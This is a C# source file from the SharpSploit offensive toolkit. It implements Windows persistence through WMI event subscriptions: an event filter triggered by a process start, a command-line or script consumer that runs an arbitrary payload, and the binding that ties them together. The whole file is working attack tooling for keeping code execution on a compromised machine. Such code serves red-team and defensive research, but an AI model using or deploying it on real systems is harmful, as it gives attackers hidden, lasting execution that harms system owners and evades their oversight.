// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Management;

namespace SharpSploit.Persistence
{
    /// <summary>
    /// WMI is a class for abusing WMI Event Subscriptions to establish peristence. Requires elevation.
    /// </summary>
    public class WMI
    {
        /// <summary>
        /// Creates a WMI Event, Consumer and Binding to execuate a payload.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <remarks>
        /// Credit to Andrew Luke (@sw4mp_f0x) for PowerLurk and
        /// Dominic Chell (@domchell) for Persistence Part 3 – WMI Event Subscription.
        /// </remarks>
        /// <param name="EventName">An arbitrary name to be assigned to the new WMI Event.</param>
        /// <param name="EventFilter">Specifies the event trigger to use. The options are ProcessStart.</param>
        /// <param name="EventConsumer">Specifies the action to carry out. The options are CommandLine (OS Command) and ActiveScript (JScript or VBScript).</param>
        /// <param name="Payload">Specifies the CommandLine or ActiveScript payload to run.</param>
        /// <param name="ProcessName">Specifies the process name when the ProcessStart trigger is selected. Defaults to notepad.exe.</param>
        /// <param name="ScriptingEngine">Specifies the scripting engine when the ActiveScript consumer is selected. Defaults to VBScript.</param>
        public static bool InstallWMIPersistence(string EventName, EventFilter EventFilter, EventConsumer EventConsumer, string Payload, string ProcessName = "notepad.exe", ScriptingEngine ScriptingEngine = ScriptingEngine.VBScript)
        {
            try
            {
                ManagementObject eventFilter = CreateEventFilter(EventName, EventFilter, ProcessName);
                ManagementObject eventConsumer = CreateEventConsumer(EventName, EventConsumer, Payload, ScriptingEngine);
                CreateBinding(eventFilter, eventConsumer);
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("WMI Exception: " + e.Message);
            }
            return false;
        }

        private static ManagementObject CreateEventFilter(string EventName, EventFilter EventFilter, string ProcessName)
        {
            ManagementObject _EventFilter = null;
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);

                string query = string.Empty;
                if (EventFilter == EventFilter.ProcessStart)
                {
                    query = $@"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='{ProcessName}'";
                }

                WqlEventQuery wql = new WqlEventQuery(query);
                _EventFilter = wmiEventFilter.CreateInstance();
                _EventFilter["Name"] = EventName;
                _EventFilter["Query"] = wql.QueryString;
                _EventFilter["QueryLanguage"] = wql.QueryLanguage;
                _EventFilter["EventNameSpace"] = @"root/cimv2";
                _EventFilter.Put();
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
            return _EventFilter;
        }

        private static ManagementObject CreateEventConsumer(string ConsumerName, EventConsumer EventConsumer, string Payload, ScriptingEngine ScriptingEngine = ScriptingEngine.VBScript)
        {
            ManagementObject _EventConsumer = null;
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
                if (EventConsumer == EventConsumer.CommandLine)
                {
                    _EventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();
                    _EventConsumer["Name"] = ConsumerName;
                    _EventConsumer["RunInteractively"] = false;
                    _EventConsumer["CommandLineTemplate"] = Payload;
                }
                else if (EventConsumer == EventConsumer.ActiveScript)
                {
                    _EventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();
                    _EventConsumer["Name"] = ConsumerName;

                    if (ScriptingEngine == ScriptingEngine.JScript)
                        _EventConsumer["ScriptingEngine"] = "JScript";
                    else if (ScriptingEngine == ScriptingEngine.VBScript)
                        _EventConsumer["ScriptingEngine"] = "VBScript";

                    _EventConsumer["ScriptText"] = Payload;
                }
                _EventConsumer.Put();
            }

            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
            return _EventConsumer;
        }

        private static void CreateBinding(ManagementObject EventFilter, ManagementObject EventConsumer)
        {
            ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
            ManagementObject _Binding = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

            _Binding["Filter"] = EventFilter.Path.RelativePath;
            _Binding["Consumer"] = EventConsumer.Path.RelativePath;
            _Binding.Put();
        }

        public enum EventFilter
        {
            ProcessStart
        }

        public enum EventConsumer
        {
            CommandLine,
            ActiveScript
        }

        public enum ScriptingEngine
        {
            JScript,
            VBScript
        }
    }
}